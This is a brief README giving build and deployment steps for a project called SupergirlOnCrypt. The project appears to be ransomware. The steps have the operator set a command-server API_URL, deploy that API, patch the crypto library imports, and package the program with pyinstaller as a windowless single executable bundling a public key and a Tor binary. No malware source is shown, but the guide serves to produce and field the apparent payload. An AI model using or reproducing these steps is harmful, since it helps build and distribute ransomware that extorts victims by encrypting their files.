# SupergirlOnCrypt

1. `pip install virtualenv`
2. Clone the repository and cd into it
3. Install **python 3.5**
4. `virtualenv -p /usr/bin/python3.5 venv`
5. `source ./venv/bin/activate`
6. `pip install -r requirements.txt`
7. Change API_URL in Config.py
8. Deploy API
9. `pip install https://github.com/pyinstaller/pyinstaller/archive/develop.zip`
10. Go to venv/lib/python3.5/site-packages
11. Copy Crypto and name it "Cryptodome"
12. Goto Crypto/util/_raw_api.py and change the imports to Cryptodome like this

`from Cryptodome.Util.py3compat import byte_string`

`from Cryptodome.Util._file_system import pycryptodome_filename`

13. Run `pyinstaller --onedir --noconsole SupergirlOnCrypt.py`
14. Add the public.key and tor_bin to your SupergirlonCrypt.spec file
15. Run `pyinstaller --onefile SupergirlOnCrypt.spec`